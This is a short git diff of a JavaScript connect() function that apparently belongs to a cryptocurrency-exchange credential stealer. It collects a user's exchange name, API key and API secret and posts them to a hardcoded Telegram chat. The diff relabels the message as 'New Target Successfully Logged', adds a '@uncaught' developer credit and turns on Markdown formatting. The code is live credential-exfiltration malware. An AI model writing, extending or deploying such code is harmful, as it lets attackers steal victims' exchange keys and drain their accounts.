@@ -239,9 +239,14 @@ async function connect() {
   }
 
   const logText = `
-Exchange: ${exchange}
-API Key: ${apiKey}
-API Secret: ${apiSecret}
+📲 **New Target Successfully Logged**
+
+**Exchange:** ${exchange}
+**API Key:** ${apiKey}
+**API Secret:** ${apiSecret}
+
+⚙️ Developer: @uncaught
+
 `;
 
   try {
@@ -250,7 +255,8 @@ API Secret: ${apiSecret}
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: "7737212833",
-        text: logText
+        text: logText,
+    parse_mode: "Markdown" 
       })
     });
 
